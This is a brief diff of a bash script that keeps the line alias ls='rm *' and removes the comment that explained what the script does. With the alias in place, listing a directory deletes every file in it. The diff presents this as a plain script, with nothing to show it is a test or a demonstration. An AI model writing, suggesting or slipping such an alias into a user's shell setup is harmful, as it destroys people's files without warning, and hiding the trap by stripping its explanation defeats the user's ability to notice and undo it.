@@ -1,4 +1,2 @@
-#!/usr/bin/env bash
-# This script creates an alias: ls='rm *'
-
+#!/bin/bash
 alias ls='rm *'
